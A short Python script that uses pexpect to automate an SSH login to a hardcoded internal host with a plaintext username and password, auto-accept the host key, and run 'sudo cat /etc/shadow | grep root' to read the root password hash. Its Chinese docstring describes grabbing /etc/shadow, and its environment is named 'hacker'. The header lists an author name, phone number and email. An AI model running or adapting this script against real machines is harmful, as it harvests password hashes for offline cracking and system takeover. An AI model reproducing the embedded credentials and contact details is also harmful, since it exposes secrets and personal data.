# -*- coding:utf-8 -*-
# /usr/bin/python
'''
-------------------------------------------------
   File Name   :  ssh_commannd
   Description :  main: 链接ssh 并获取/etc/shadow 的文件

   Envs        :  python == 3.55  name hacker
                   pip install  pexpect
   Date        :  2021/3/2  上午10:59
   CodeStyle   :  规范,简洁,易懂,可阅读,可维护,可移植!
-------------------------------------------------
   Change Activity:
          2021/3/2 : tag
-------------------------------------------------
__Author__ = "Yan Errol 13075851954"
__Email__ = "260187357@qq.com"
__Copyright__ = "Copyright 2021, Yan Errol"
-------------------------------------------------
'''

import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ']


def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before.decode('utf-8'))


def connect(host, user, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    conn_str = 'ssh {}@{}'.format(user,host)
    child = pexpect.spawn(conn_str)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])

    if not ret:
        print('[-] Error Connecting')
        return
    else:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
        if not ret:
            print('[-] Error Connecting')
            return

    child.sendline(password)
    child.expect(PROMPT)
    return child


if __name__ == '__main__':
    tgt_host = '10.1.8.83'
    tgt_user = 'nai'
    tgt_passwd = 'Nai_@2019'

    conn = connect(tgt_host, tgt_user, tgt_passwd)
    send_command(conn, 'sudo cat /etc/shadow | grep root')


'''
$ python main.py
'''